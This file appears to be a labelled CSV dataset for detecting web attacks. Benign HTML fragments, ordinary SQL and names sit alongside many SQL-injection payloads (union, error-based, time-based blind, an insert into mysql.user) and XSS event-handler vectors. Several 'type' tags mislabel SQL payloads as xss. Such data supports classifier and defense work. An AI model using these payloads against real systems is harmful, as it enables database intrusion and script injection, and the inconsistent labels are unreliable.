Text,Label,type
"	 </span>. <i><a href=""/wiki/Nature_(journal)"" title=""Nature (journal)"">Nature </a> </i>. <b>550 </b> (7676): 354–359. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2017Natur.550..354S"">2017Natur.550..354S </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1038%2Fnature24270"">10.1038/nature24270 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/0028-0836"">0028-0836 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/29052630"">29052630 </a>. <q>AlphaGo Lee... 12 convolutional layers </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Nature&amp;rft.atitle=Mastering+the+game+of+Go+without+human+knowledge&amp;rft.volume=550&amp;rft.issue=7676&amp;rft.pages=354-359&amp;rft.date=2017-10-19&amp;rft_id=info%3Adoi%2F10.1038%2Fnature24270&amp;rft.issn=0028-0836&amp;rft_id=info%3Apmid%2F29052630&amp;rft_id=info%3Abibcode%2F2017Natur.550..354S&amp;rft.aulast=Silver&amp;rft.aufirst=David&amp;rft.au=Schrittwieser%2C+Julian&amp;rft.au=Simonyan%2C+Karen&amp;rft.au=Antonoglou%2C+Ioannis&amp;rft.au=Huang%2C+Aja&amp;rft.au=Guez%2C+Arthur&amp;rft.au=Hubert%2C+Thomas&amp;rft.au=Baker%2C+Lucas&amp;rft.au=Lai%2C+Matthew&amp;rft.au=Bolton%2C+Adrian&amp;rft.au=Chen%2C+Yutian&amp;rft.au=Lillicrap%2C+Timothy&amp;rft.au=Fan%2C+Hui&amp;rft.au=Sifre%2C+Laurent&amp;rft.au=Driessche%2C+George+van+den&amp;rft.au=Graepel%2C+Thore&amp;rft.au=Hassabis%2C+Demis&amp;rft_id=http%3A%2F%2Fdiscovery.ucl.ac.uk%2F10045895%2F1%2Fagz_unformatted_nature.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<track onkeyup=""alert(1)"" contenteditable>test</track>",2,xss
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,2,xss
	 </span> </h3>,0,xss
villanueva de huerva,0,sql
<hgroup onpointerdown=alert(1)>XSS</hgroup>,2,xss
admin' or '1'  =  '1'/*,1,sql
"1' and make_set  (  8403  =  8403,8899  )  ",1,xss
"-8200' in boolean mode  )   union all select 3360,3360--",1,xss
50296,0,sql
1 where 8393  =  8393,1,sql
	 </span> </li>,0,xss
-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,1,sql
5.15574E+15,0,xss
SELECT AVG ( Price ) FROM detail,0,xss
<acronym onpointerover=alert(1)>XSS</acronym>,2,xss
"   SELECT COUNT ( hold ) , near FROM influence BY ground",0,sql
<isindex onpointermove=alert(1)>XSS</isindex>,2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Infosys&amp;rft.atitle=Role+of+AI+in+travel+and+Hospitality+Industry&amp;rft.date=2018&amp;rft_id=https%3A%2F%2Fwww.infosys.com%2Findustries%2Ftravel-hospitality%2Fdocuments%2Fai-travel-hospitality.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 179 )  ORDER BY meta_id ASC",0,sql
6085,0,sql
SELECT * FROM choose WHERE straw = 'wire' LIMIT 3,0,xss
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,1,sql
select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,1,sql
1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1,xss
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",1,sql
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
WHERE EXISTS  ( SELECT ProductName FROM   Products WHERE Products.SupplierID  =  Suppliers.supplierID AND Price  =  22 ) ;,0,sql
SELECT * FROM control WHERE telephone NOT LIKE '[unless]%',0,sql
"  SELECT Orders.legrID, Employees.hair, Employees.oil FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.packageID ORDER BY Orders.underID",0,xss
12489,0,sql
"-9656"" union all select 8735,8735--",1,sql
"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
<head id=x tabindex=1 onfocusin=alert(1)></head>,2,xss
"<image draggable=""true"" ondragleave=""alert(1)"">test</image>",2,xss
1'  )   and 9198  =  9198--,1,sql
SELECT * FROM simply WHERE hurried NOT LIKE 'alphabet%',0,xss
1'   )    )     )   and 5934  =  2309,1,sql
"<li><a href=""/wiki/Problem_of_other_minds"" title=""Problem of other minds"">Problem of other minds </a> </li>",0,xss
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",1,xss
"<dl oncontextmenu=""alert(1)"">test</dl>",2,xss
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",2,xss
SELECT AVG ( Price ) FROM recognize,0,xss
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",2,xss
"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
84276481l,0,sql
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1,sql
"            <div id=""p-namespaces"" role=""navigation"" class=""vectorTabs "" aria-labelledby=""p-namespaces-label"">",0,xss
"""^""",1,sql
" <script type=""text/javascript"" src=""_static/js/modernizr.min.js""></script>",0,xss
or a  =  a--,1,xss
pernign,0,sql
	 </span> </h4>,0,xss
SELECT * FROM gone WHERE around = 'bear' LIMIT 3,0,sql
"  SELECT aroundID AS ID, value AS tongue FROM surprise",0,sql
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",2,xss
SELECT * FROM heading WHERE tie = 'nearer',0,sql
"   SELECT COUNT ( principle ) , office FROM idea BY biggest",0,sql
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1,xss
SELECT * FROM roar ORDER BY represent,0,sql
"1""  )   where 4382  =  4382 and 6607  =  2394--",1,sql
	 </span>,0,xss
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1,sql
 </li>,0,xss
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"<section onmouseleave=""alert(1)"">test</section>",2,xss
"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",1,sql
SELECT AVG ( lay ) FROM pass,0,sql
<marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus>,2,xss
e0iz877,0,sql
"1%""   )    )     )   union all select null,null,null,null,null,null#",1,sql
"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
8ro4,0,sql
"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",1,xss
"1"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT MIN ( weather )  AS rear FROM discuss,0,sql
"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",1,sql
<section onpointermove=alert(1)>XSS</section>,2,xss
alcoholado sabaters,0,sql
"<span onbeforecopy=""alert(1)"" contenteditable>test</span>",2,xss
"<frameset oncontextmenu=""alert(1)"">test</frameset>",2,xss
SELECT * FROM primitive WHERE equal = 'arrange',0,sql
SELECT * FROM peace,0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;25 </li> </ul>",0,xss
SELECT * FROM chamber  WHERE think NOT LIKE '[add]%',0,sql
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",2,xss
document.documentURI,2,xss
"<ul><li><a href=""/wiki/Behaviorism"" title=""Behaviorism"">Behaviorism </a> (<a href=""/wiki/Radical_behaviorism"" title=""Radical behaviorism"">Radical </a>) </li>",0,xss
" </p><p><a href=""/wiki/Ray_Kurzweil"" title=""Ray Kurzweil"">Ray Kurzweil </a> has used <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Moore's law </a> (which describes the relentless exponential improvement in digital technology) to calculate that <a href=""/wiki/Desktop_computer"" title=""Desktop computer"">desktop computers </a> will have the same processing power as human brains by the year 2029, and predicts that the singularity will occur in 2045.<sup id=""cite_ref-Singularity_410-2"" class=""reference""><a href=""#cite_note-Singularity-410"">&#91;398&#93; </a> </sup>",0,xss
"	 </span> <span class=""reference-text"">",0,xss
" SELECT * FROM today ORDER BY taught ASC, vast DESC",0,sql
</div>,0,xss
SELECT * FROM art,0,xss
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
7.67474E+13,0,xss
SELECT TOP 3 * FROM weather,0,sql
"<div onbeforecut=""alert(1)"" contenteditable>test</div>",2,xss
SELECT COUNT ( windowID ) FROM top,0,sql
" select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",1,sql
" SELECT * FROM glass ORDER BY rabbit ASC, lay DESC",0,xss
SELECT wood,0,sql
<command id=x tabindex=1 onfocus=alert(1)></command>,2,xss
5exas9labo,0,xss
<details onpointerleave=alert(1)>XSS</details>,2,xss
"	 </span> <span class=""reference-text"">""33 Corporations Working On Autonomous Vehicles"". CB Insights. N.p., 11 August 2016. 12 November 2016. ",0,xss
SELECT potatoes ( s )  FROM search LEFT JOIN,0,sql
"	 </span> <span class=""toctext"">Cybernetics and brain simulation ",0,xss
"1   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   6659  =  6659",1,sql
"1   )    )     )   union all select null,null,null,null,null,null,null,null--",1,xss
dehr,0,sql
49si90q00m87a,0,sql
tripicallero,0,sql
"calle ladera, 147 10-e",0,sql
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"	 </span> <span class=""reference-text"">",0,xss
"<menu onclick=""alert(1)"">test</menu>",2,xss
SELECT * FROM particular WHERE television = 'say' LIMIT 3,0,sql
"1""   )    )     )   and 5429  =  9596",1,sql
SELECT funny FROM corn,0,sql
90946866j,0,sql
	 </span> ,0,xss
inca,0,sql
<xmp onpointerup=alert(1)>XSS</xmp>,2,xss
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,sql
1526,0,sql
<wbr onpointerdown=alert(1)>XSS</wbr>,2,xss
mclendon,0,sql
"1""   )    )    as sdlv where 5922  =  5922 and 2006  =  2006",1,sql
Knowledge revolution:,0,xss
" end and    (    (     (  ""poee""  =  ""poee",1,sql
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"   SELECT hunt,women,orange,bottom,where     (  (  depth JOIN atmosphere ON describe.correctly =  actually.copper )   INNER JOIN fasterON Orders.eight =  ocean.loseID ) ",0,sql
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",1,sql
	 </span>(2011) </li>,0,xss
"<img onmouseleave=""alert(1)"">test</img>",2,xss
1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1,sql
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>,2,xss
or 2 between 1 and 3,1,sql
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,2,xss
SELECT * FROM include WHERE strip = 'eager'  AND  ( flat = 'positive' OR fighting = 'drop' ) ,0,sql
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,sql
<ul>,0,xss
"1""   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
FROM  ( SELECT DISTINCT Country FROM Customers ) ;,0,xss
"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,xss
SELECT fought ( s )  FROM planned,0,sql
<base onpointerdown=alert(1)>XSS</base>,2,xss
alcalde manuel de la pinta s/n 13?f,0,sql
1  )   where 7680  =  7680 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,sql
"<li class=""toclevel-3 tocsection-55""><a href=""#Autonomous_weapons""><span class=""tocnumber"">8.2.5 ",0,xss
"<li><a href=""/wiki/Computational_social_science"" title=""Computational social science"">Computational social science </a> </li>",0,xss
"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,xss
pelland,0,sql
furnari pentinat,0,xss
"<style>@keyframes slidein {}</style><th style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></th>",2,xss
"calle profeta, 96, 2?c",0,sql
07375030b,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Robotics"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""3"">",0,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_1_link' LIMIT 1,0,sql
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,sql
"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",1,xss
2.20136E+15,0,xss
 or 'x'  =  'x,1,sql
dobbing3,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",2,xss
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,2,xss
"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,sql
1%'   )    )     )   and sleep  (  5  )  #,1,sql
1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
7650,0,sql
SELECT * FROM smell  WHERE roar NOT LIKE '[review]%',0,sql
"-9684"" order by 1#",1,sql
"<li><a href=""/wiki/Ferroelectric_RAM"" title=""Ferroelectric RAM"">FRAM </a> </li>",0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'rkoe'  =  'rkoe",1,sql
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,sql
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%',0,sql
<blockquote onpointerout=alert(1)>XSS</blockquote>,2,xss
"  UPDATE zebra SET mighty =  'ground', City =  'worried' WHERE press =  cent",0,sql
1'||  (  select 'sdll' where 5074  =  5074 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,sql
<dd id=x tabindex=1 onfocusin=alert(1)></dd>,2,xss
order by,1,sql
retiendas,0,sql
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",1,xss
"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",1,xss
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND tr.object_id IN  ( 262310, 262326, 262328 )  ORDER BY t.name ASC",0,sql
"1' where 7445  =  7445 union all select null,null,null,null,null,null--",1,sql
1'   )    )    as zari where 6847  =  6847,1,sql
"1'||  (  select 'dujx' where 6896  =  6896 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
 UPDATE grain SET bark = 'tower'WHERE easier = 'coast',0,sql
SELECT AVG ( corner ) FROM whose SELECT SUM ( unusual ) ,0,sql
halliwil,0,sql
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0,sql
"<h2><span class=""mw-headline"" id=""References"">References ",0,xss
SELECT * FROM independent WHERE including = 'sell' LIMIT 3,0,xss
" SELECT * FROM station ORDER BY bark, won",0,sql
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,1,sql
SELECT AVG ( edge ) FROM wheat SELECT SUM ( sing ) ,0,sql
"   SELECT Employees.flies, COUNT ( Orders.replaceID )  AS collectFROM    ( OrdersINNER JOIN cowboy ON Orders.fuelID  =  Employees.flameID ) ",0,xss
SELECT * FROM park WHERE tried  BETWEEN 10 AND 20,0,xss
spencer,0,sql
SELECT officer FROM garden UNION SELECT full FROM obtain ORDER BY captain,0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c828cc7449' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
" </tr><tr><td style=""text-align:right;font-size:115%"">",0,xss
SELECT MIN ( hung )  AS shaking FROM breakfast,0,sql
